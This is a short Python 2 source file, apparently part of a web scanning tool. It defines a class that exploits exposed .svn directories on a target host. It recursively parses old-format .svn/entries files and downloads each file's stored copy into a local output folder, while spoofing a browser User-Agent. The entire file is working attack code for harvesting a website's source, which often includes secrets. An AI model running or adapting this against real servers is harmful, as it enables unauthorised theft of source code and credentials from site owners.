from http import HTTP

class RipperSVNOLD(object):
    def __init__(self, vulnerability):
        self.vulnerability = vulnerability
        self.host = vulnerability['host']
        self.session = HTTP()
        self.session.headers['User-Agent'] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"

    def parse_entries(self, entries_file=None, directory=""):
        if not entries_file:
            entries_file = self.vulnerability['data']

        entries = entries_file.split("\n")

        for x in range(len(entries)):
            if(entries[x] == "dir"):
                if not entries[x-1]:
                    continue

                data = self.session.get(self.host.replace(path=directory + entries[x-1] + "/.svn/entries")).content

                self.parse_entries(data, directory + entries[x-1] + "/")

            if(entries[x] == "file"):
                self.download_file(
                    self.host.replace(path=directory + ".svn/text-base/" + entries[x-1] + ".svn-base"),
                    "output/" + directory + "/" + entries[x-1]
                )

    def download_file(self, url, dest):
        if self.session.get_file(url, dest):
            print "Fetched " + str(url)